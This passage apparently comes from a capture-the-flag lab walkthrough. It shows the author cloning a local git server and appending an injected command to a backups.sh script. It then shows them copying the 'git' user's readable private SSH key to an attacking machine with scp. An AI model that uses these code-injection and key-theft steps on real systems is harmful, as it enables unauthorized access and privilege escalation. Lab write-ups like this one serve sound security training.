#### -Searched more and found directory "git-server" and found it being owned by "git" user and was git backend files which are difficult to work with so I navigated to "/tmp" directory and typed "git clone file:///git-server/" to clone the server into the "/tmp" directory:

![](Pasted%20image%2020221017175722.png)

#### -Now we can review the contents of "backups.sh" file which shows as a place holder file:

#### -Set up git identity by typing git config --global user.name "dademola" AND git config --global user.email "dademola@hunit.(none)"

![](Pasted%20image%2020221017180308.png)

#### -Typed "echo "touch /tmp/gitscript-test" >> backups.sh" and "chmod +x backups.sh" to inject a test instruction into the "backups.sh" file and to make it executable:

#### -But after receiving an error when trying to push the file onto the git-server and further investigation the server is owned by user "git":

#### -Found a user named "git" and found we have read and execute permissions on their ssh "id_rsa" file which is a private SSH Key:

#### -Navigate to my kali machine and typed "scp -P 43022 dademola@192.168.93.125:/home/git/.ssh/id_rsa ." to upload the private ssh key to my kali machine and "chmod 600" to set the correct permissions:
